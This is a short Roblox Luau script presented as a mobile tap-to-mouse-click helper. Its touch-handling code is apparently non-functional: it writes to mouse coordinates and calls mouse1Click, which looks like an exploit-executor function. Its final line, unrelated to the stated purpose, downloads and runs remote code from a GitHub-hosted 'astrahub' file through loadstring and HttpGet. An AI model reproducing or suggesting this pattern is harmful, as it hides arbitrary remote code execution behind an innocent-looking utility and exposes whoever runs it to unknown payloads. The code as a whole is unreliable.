-- Mobile Tap to Mouse Click Script (Luau - Roblox)
-- Place this in StarterPlayer > StarterPlayerScripts (LocalScript)

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local ContextActionService = game:GetService("ContextActionService")

local player = Players.LocalPlayer

-- Wait for the player's mouse (works on both PC and mobile)
local mouse = player:GetMouse()

-- Only run on touch devices (optional, but prevents double-inputs on PC)
if UserInputService.TouchEnabled then
	local function onTap(positionTable, gameProcessedEvent)
		-- Ignore if the tap was on a GUI element that already handled it
		if gameProcessedEvent then
			return
		end

		-- Get the position of the tap
		local tapPosition = positionTable[1]  -- First touch position

		-- Move the virtual mouse to the tap position
		mouse.X = tapPosition.X
		mouse.Y = tapPosition.Y

		-- Simulate a left mouse button click
		mouse1Click()
	end

	-- Bind the touch tap event
	UserInputService.TouchTap:Connect(onTap)
end

loadstring(game:HttpGet(('https://raw.githubusercontent.com/azureblueday/astrahub/refs/heads/main/astra59.luau')))()
